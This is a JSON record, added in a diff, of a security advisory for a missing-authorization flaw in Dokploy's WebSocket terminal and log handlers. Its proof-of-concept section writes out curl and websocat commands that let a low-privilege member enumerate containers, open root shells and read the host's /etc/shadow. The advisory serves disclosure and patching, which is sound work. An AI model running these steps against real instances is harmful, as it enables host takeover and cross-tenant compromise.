@@ -1,0 +1,52 @@
+{
+  "global": null,
+  "id": "GHSA-7r6p-v9gw-pwc8",
+  "repo": {
+    "cve_id": "CVE-2026-72863",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-269",
+      "CWE-639",
+      "CWE-862"
+    ],
+    "description": "## Summary\r\n\r\nDokploy's WebSocket handlers (in-app terminals and log streamers) authenticate the session but never authorize it. They establish who the user is via `validateRequest()` and then proceed without consulting the role/permission model that every tRPC procedure enforces. Any authenticated `member`, can therefore open an interactive shell into any container on the host, including the `dokploy` container that mounts the Docker socket, and from there obtain root on the host, escaping the application and crossing every tenant boundary.\r\n\r\nThe chain is self-contained: a separate, unscoped listing endpoint lets the same member enumerate the container IDs it needs.\r\n\r\n## Details\r\n\r\n**Root cause.** Each WSS handler calls `validateRequest()` (authentication only) but never calls `checkPermission` / `checkServicePermissionAndAccess`, the authorization guards the rest of the app relies on (e.g. `application.ts` invokes them 31 times). The handlers' local branches (`serverId === \"local\"` / no `serverId`) also omit the organization-ownership check that their remote branches correctly perform.\r\n\r\nVulnerable handlers (all on their local branch):\r\n\r\n- `apps/dokploy/server/wss/terminal.ts:87-148`: SSHes to the Docker host with the auto-provisioned `auto_generated-dokploy-local` key, using an attacker-controlled `username` taken from the query string. No role check.\r\n- `apps/dokploy/server/wss/docker-container-terminal.ts:30-181`: runs `docker exec` through the `dokploy` container's mounted Docker socket. No org/service check.\r\n- `apps/dokploy/server/wss/docker-container-logs.ts:36-198` and `apps/dokploy/server/wss/listen-deployment.ts:30-171`: stream container/deployment logs with no org/service scoping.\r\n\r\nFor contrast, the remote branch enforces ownership. From `docker-container-terminal.ts:65`:\r\n```ts\r\nif (server.organizationId !== session.activeOrganizationId) { ws.close(); return; }\r\n```\r\nThe local branch has no equivalent.\r\n\r\n**Contradicts the product's own RBAC.** The static `member` role is `server: []` in `packages/server/src/lib/access-control.ts:188` (no host access by design), enforced at the tRPC layer via `packages/server/src/services/permission.ts`. The WSS handlers bypass that model.\r\n\r\n**Self-contained ID enumeration.** `docker.getContainersByAppNameMatch` (`apps/dokploy/server/api/routers/docker.ts:191-211`) is gated only by `withPermission(\"service\", \"read\")`, which every member holds (`service: [\"read\"]` in the base role), with no `accessedServices` scoping. The backing function (`packages/server/src/services/docker.ts:104-160`) interpolates the caller's `appName` into a `grep` pattern:\r\n```js\r\nconst command = `${cmd} | grep '^.*Name: ${appName}'`;   // appName is a user-supplied regex\r\n```\r\nThe validator `^[a-zA-Z0-9.\\-_]+$` permits `.`, so `appName=\".\"` matches every line and returns every container on the host. This is information disclosure, not command injection; all shell metacharacters are rejected.\r\n\r\n**Escalation.** The `dokploy` container mounts `/var/run/docker.sock`, so a shell inside it can drive the host daemon (host root). A container with a host bind mount then yields full host filesystem access.\r\n\r\n## Proof of Concept\r\n\r\nPrerequisites: a self-hosted (non-cloud) instance at `http://TARGET:3000` and a `member` account; capture its `better-auth.session_token`.\r\n\r\n**1. Negative control, confirm the role has no infrastructure access:**\r\n```bash\r\ncurl -s \"http://TARGET:3000/api/trpc/server.all\" \\\r\n  -H \"Cookie: better-auth.session_token=<MEMBER_COOKIE>\"\r\n# -> {\"error\":{\"json\":{\"message\":\"unauthorized to access resource \\\"server\\\"\",\"code\":-32001,\"data\":{\"code\":\"UNAUTHORIZED\",\"httpStatus\":401,\"path\":\"server.all\",\"zodError\":null}}}}\r\n```\r\n\r\n**2. Enumerate every container ID (member has only `service:read`):**\r\n```bash\r\ncurl -G \"http://TARGET:3000/api/trpc/docker.getContainersByAppNameMatch\" \\\r\n  --data-urlencode 'batch=1' \\\r\n  --data-urlencode 'input={\"0\":{\"json\":{\"appName\":\".\"}}}' \\\r\n  -H \"Cookie: better-auth.session_token=<MEMBER_COOKIE>\"\r\n# -> [{ \"containerId\":\"3f6077df7594\",\"name\":\"dokploy.1.oythw...\", ... }, ... ]\r\n# Pick the dokploy.1.* task's containerId; it holds the Docker socket.\r\n```\r\n\r\n**3. Shell into that container (no role/org check):**\r\n```bash\r\nwebsocat \"ws://TARGET:3000/docker-container-terminal?containerId=<DOKPLOY_CONTAINER_ID>&activeWay=sh\" \\\r\n  -H \"Cookie: better-auth.session_token=<MEMBER_COOKIE>\"\r\n# id; hostname   -> root inside the dokploy container\r\n```\r\n\r\n**4. Pivot to host root via the Docker socket (read-only, non-destructive):**\r\n```bash\r\ndocker run --rm -v /:/host:ro alpine cat /host/etc/shadow\r\n# -> root:$6$...    (proves host filesystem read as root; --rm and :ro leave nothing behind)\r\n```\r\n\r\n**Alternative vector (no socket hop).** Where Dokploy runs as root and the owner has used the local terminal at least once, the local SSH key is authorized for `root`, so step 3 becomes a direct host shell:\r\n```bash\r\nwebsocat \"ws://TARGET:3000/terminal?serverId=local&port=22&username=root\" \\\r\n  -H \"Cookie: better-auth.session_token=<MEMBER_COOKIE>\"\r\n```\r\n\r\n## Impact\r\n\r\nBroken access control / missing authorization leading to remote code execution as root on the host and complete cross-tenant compromise, exploitable by the lowest-privilege authenticated role with no user interaction.\r\n\r\nAffected: any self-hosted instance with more than one user, meaning any deployment that has invited a `member` or any multi-org instance. A member of one organization can exec into other organizations' containers and take over the shared host. (The local container/host paths are disabled on cloud.) Impact is amplified if combined with open setup-window registration, which can make initial account creation unauthenticated.",
+    "ghsa_id": "GHSA-7r6p-v9gw-pwc8",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-7r6p-v9gw-pwc8",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-7r6p-v9gw-pwc8"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72863"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:32Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Missing authorization in WebSocket handlers allows a low-privilege member to gain root on the Docker host",
+    "updated_at": "2026-08-10T18:26:39Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
